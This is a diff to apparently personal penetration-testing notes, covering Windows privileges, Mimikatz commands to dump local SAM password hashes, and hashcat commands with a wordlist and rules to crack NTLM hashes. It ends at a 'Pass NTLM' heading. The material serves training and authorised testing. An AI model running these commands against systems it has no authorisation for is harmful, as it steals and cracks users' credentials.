@@ -80,22 +80,29 @@ Password modules:
 
 Access right needed:
 - extraction: __SeDebugPrivilege__
-- privilege escalation: __SeImpersonatePrivilege__ (e.g. local administrators)
+- privilege escalation ("impersonation"): __SeImpersonatePrivilege__ (e.g. local administrators)
 
-## NTLM
+Commands:
+```
+mimikatz # privilege::debug # with SeDebugPrivilege access rights
+mimikatz # token::elevate # with SeImpersonatePrivilege access rights
+mimikatz # lsadump::sam # hash dump
+```
+
+## NTLM hash cracking
 
 On Windows:
 ```
-Get-LocalUser
-.\mimikatz.exe
-privilege::debug
-token::elevate
-lsadump::sam
+PS> Get-LocalUser
+PS> c:\path\to\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
 ```
-Back on Kali:
+Take the hashes back to Kali:
 ```
-hashcat -h | grep -i ntlm
-hashcat -m ntlm.mode user.hash /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
+hashcat -h | grep -i ntlm # get the NTLM code: 1000
+hashcat -m ntlm_mode_code user_hash.txt /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
 ```
 
 ## Pass NTLM
